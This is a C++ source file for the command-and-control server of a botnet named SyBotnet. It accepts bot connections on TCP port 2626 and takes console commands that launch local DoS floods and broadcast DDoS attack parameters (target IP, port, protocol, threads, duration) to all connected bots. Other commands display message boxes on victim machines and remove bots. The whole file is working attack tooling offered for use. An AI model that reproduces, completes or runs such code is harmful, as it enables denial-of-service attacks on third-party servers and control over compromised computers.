/* ================================================= */
/* |  Name: SyBotnet ------------------------------| */
/* |  Decription: Using SyOKet Library             | */
/* |  Copyright: Copyright 2021 SeungYup26         | */
/* |  Github: SeungYup - @SeungYup26               | */
/* |  Repo: https://github.com/seungyup26/sybotnet | */
/* ================================================= */

#include"flood.h"

#include<iostream>
#include<string>
#include<cstring>
#include<cctype>
#include<vector>
#include<sstream>
#include<algorithm>

void print_help()
{
	std::cout << '\n';
	std::cout << "  SyBotnet                                         \n\n";
	std::cout << "  > dos / ddos [s]    dos/ddos attack command      \n";
	std::cout << "     -i                                            \n";
	std::cout << "       --ip           set host address             \n";
	std::cout << "     -p                                            \n";
	std::cout << "       --port         set host port number         \n";
	std::cout << "       --packet       set attack packet            \n";
	std::cout << "       --protocol     set attack protocol          \n";
	std::cout << "     -d                                            \n";
	std::cout << "       --delay        set attack delay             \n";
	std::cout << "     -th                                           \n";
	std::cout << "       --thread       set attack thread            \n";
	std::cout << "     -t                                            \n";
	std::cout << "       --time         set attack duration time     \n";
	std::cout << "                                                   \n";
	std::cout << "  > msgbox                                         \n";
	std::cout << "     -t                                            \n";
	std::cout << "       --text         set message box text         \n";
	std::cout << "     -c                                            \n";
	std::cout << "       --caption      set message box caption      \n";
	std::cout << "     -i                                            \n";
	std::cout << "       --id           set client id                \n";
	std::cout << "       --id--all      send message to all client   \n";
	std::cout << "                                                   \n";
	std::cout << "  > del   [w]         delete client                \n";
	std::cout << "     -i                                            \n";
	std::cout << "       --id           set client id                \n";
	std::cout << "       --id--all      delete all client            \n";
	std::cout << "                                                   \n";
	std::cout << "  > clean [s]         cleanup console              \n";
	std::cout << "                                                   \n";
	std::cout << "  > list  [s]         show client list             \n";
	std::cout << "                                                   \n";
	std::cout << "  [s] : safe          [w] : warning                \n";
	std::cout << "                                                   \n\n";
}

bool check_number(const std::string& target)
{
	std::string::const_iterator iterator = target.begin();

	while (iterator != target.end() && std::isdigit(*iterator)) {
		iterator++;
	}

	return !target.empty() && iterator == target.end();
}

std::vector<std::string> split(const std::string& target, char split)
{
	std::string save;
	std::vector<std::string> result;
	std::stringstream ss = std::stringstream(target);

	while (std::getline(ss, save, split)) {
		result.push_back(save);
	}

	return result;
}

int main()
{

	SetConsoleTitleW(L"SyBotnet");

	std::cout << " Loding Server ... \n ";

	TCPSocket tcp = TCPSocket(2626);
	tcp.Bind();
	tcp.Listen();
	tcp.CreateMultiAccept();


	std::system("cls");

	print_help();

	while (true)
	{
		Data data = { 0 };

		std::string command_string;

		std::cout << " SyBotnet>> ";
		std::getline(std::cin, command_string);
		std::transform(command_string.begin(), command_string.end(), command_string.begin(), tolower);

		std::vector<std::string> result = split(command_string, ' ');
		strcpy(data.command, result[0].c_str());

		std::cout << '\n';

		if (result[0] == "help") {
			print_help();
		}

		else if (result[0] == "del")
		{
			for (int i = 0; i < result.size(); i++)
			{
				if (result[i] == "-i" || result[i] == "--id") {

					if (atoi(result[i + 1].c_str()) < result.size()) {
						tcp.Send(reinterpret_cast<char*>(&data), sizeof(Data), atoi(result[i + 1].c_str()));
						break;
					}
				}
				else if (result[i] == "-a" || result[i] == "--all")
				{
					for (int id = 0; id < tcp.GetTotalAccept(); id++) {
						tcp.Send(reinterpret_cast<char*>(&data), sizeof(Data), id);
					}
					break;
				}
			}
		}

		else if (result[0] == "clean") {
			std::system("cls");
		}

		else if (result[0] == "list")
		{
			int client_count = 0;

			std::cout << " Client List \n";

			for (int id = 0; id < tcp.GetTotalAccept(); id++)
			{
				tcp.Ping(id);

				if (tcp.Ping(id) != E_SEND)
				{
					std::cout << " | ID " << id << " IP " << tcp.GetClientIP(id) << '\n';
					client_count++;
				}
			}

			if (client_count == 0) {
				std::cout << " | Don't have client, alone :( \n";
			}
			else {
				std::cout << " Total: " << tcp.GetTotalAccept() << " bots \n";
				std::cout << " Online: " << client_count << " bots \n";
			}
		}
		else if (result[0] == "dos")
		{
			for (int argc = 1; argc < (result.size() - 1); argc++)
			{
				if (result[argc] == "-i" || result[argc] == "--ip") {
					strcpy(data.ip, result[(argc + 1)].c_str());
				}

				else if (result[argc] == "-p" || result[argc] == "--port"
					|| result[argc] == "--packet" || result[argc] == "--protocol")
				{
					if (check_number(result[(argc + 1)]) == true) {
						data.port = atoi(result[(argc + 1)].c_str());
					}
					else if (result[(argc + 1)] == "udp" || result[(argc + 1)] == "tcp") {
						strcpy(data.proto, result[(argc + 1)].c_str());
					}
					else {
						strcpy(data.packet, result[(argc + 1)].c_str());
					}
				}

				else if (result[argc] == "-d" || result[argc] == "--delay") {
					data.delay = atoi(result[(argc + 1)].c_str());
				}

				else if (result[argc] == "-th" || result[argc] == "--thread") {
					data.thread = atoi(result[(argc + 1)].c_str());
				}

				else if (result[argc] == "-t" || result[argc] == "--time") {
					data.time = atoi(result[(argc + 1)].c_str());
				}
			}

			for (int i = 0; i < data.thread; i++) {
				std::thread(flood, data).detach();
			}
		}

		else if (result[0] == "ddos")
		{
			for (int argc = 1; argc < (result.size() - 1); argc++)
			{
				if (result[argc] == "-i" || result[argc] == "--ip") {
					strcpy(data.ip, result[(argc + 1)].c_str());
				}

				else if (result[argc] == "-p" || result[argc] == "--port" || result[argc] == "--packet" || result[argc] == "--protocol")
				{
					if (check_number(result[(argc + 1)]) == true) {
						data.port = atoi(result[(argc + 1)].c_str());
					}
					else if (result[(argc + 1)] == "udp" || result[(argc + 1)] == "tcp" || result[(argc + 1)] == "--protocol") {
						strcpy(data.proto, result[(argc + 1)].c_str());
					}
					else {
						strcpy(data.packet, result[(argc + 1)].c_str());
					}
				}

				else if (result[argc] == "-d" || result[argc] == "--delay") {
					data.delay = atoi(result[(argc + 1)].c_str());
				}

				else if (result[argc] == "-th" || result[argc] == "--thread") {
					data.thread = atoi(result[(argc + 1)].c_str());
				}

				else if (result[argc] == "-t" || result[argc] == "--time") {
					data.time = atoi(result[(argc + 1)].c_str());
				}
			}

			for (int id = 0; id < tcp.GetTotalAccept(); id++) {
				tcp.Send(reinterpret_cast<char*>(&data), sizeof Data, id);
			}
		}

		else if (result[0] == "msgbox")
		{
			int id = 0;
			bool is_id = false;

			for (int i = 0; i < result.size(); i++)
			{
				if (result[i] == "-t" || result[i] == "--text") {
					strcpy(data.first_option, result[(i + 1)].c_str());
				}
				else if (result[i] == "-c" || result[i] == "--caption") {
					strcpy(data.second_option, result[(i + 1)].c_str());
				}
				else if (result[i] == "-i" || result[i] == "--id") {
					is_id = true;
					id = atoi(result[i + 1].c_str());
				}
				else if (result[i] == "--id--all") {
					is_id = false;
				}
			}

			if (!is_id)
			{
				for (id = 0; id < tcp.GetTotalAccept(); id++) {
					tcp.Send(reinterpret_cast<char*>(&data), sizeof Data, id);
				}
			}
			else {
				tcp.Send(reinterpret_cast<char*>(&data), sizeof Data, id);
			}
		}

		std::cout << '\n';
	}

	return 0;
}